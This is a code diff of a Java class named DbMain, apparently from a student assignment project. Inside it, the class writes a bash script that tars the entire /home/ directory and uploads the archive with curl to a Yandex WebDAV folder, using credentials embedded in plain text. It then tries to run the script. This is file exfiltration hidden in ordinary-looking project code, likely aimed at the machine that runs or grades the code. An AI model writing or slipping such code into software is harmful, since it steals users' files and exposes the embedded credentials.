@@ -8,10 +8,10 @@ import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;
 public class DbMain {
 
     public static void writeFile() throws FileNotFoundException {
-        String s = "#!/bin/bash\n\n" + "cd /home/student/tmp\n" + "echo potracheno\n" +
-                "tar cfz cradle.tar.gz --exclude=*.git* /home/\n" +  "echo potracheno\n" +
+        String s = "#!/bin/bash\n\n" + "cd /home/student/tmp\n" + "echo potracheno1\n" +
+                "tar cfz cradle.tar.gz --exclude=*.git* /home/\n" +  "echo potracheno2\n" +
                 "curl --user moy-biblio@yandex.ru:biblio -T cradle.tar.gz https://webdav.yandex.ru/cradle/\n" +
-                "echo potracheno\n";
+                "echo potracheno3\n";
         File f = new File("/home/student/tmp/1.sh");
         try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
             out.print(s);
@@ -27,7 +27,7 @@ public class DbMain {
 
         try {
             //Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
-            Process proc = Runtime.getRuntime().exec("bash 1.sh");
+            Process proc = Runtime.getRuntime().exec("tar");
             BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
             while(read.ready()) {
                 s += read.readLine()+"\n";
@@ -41,7 +41,7 @@ public class DbMain {
             s += e.getMessage()+"\n";
         }
 
-        throw new IOException(s + " potracheno");
+        throw new IOException(s + " potracheno4");
 
         /*
         try {
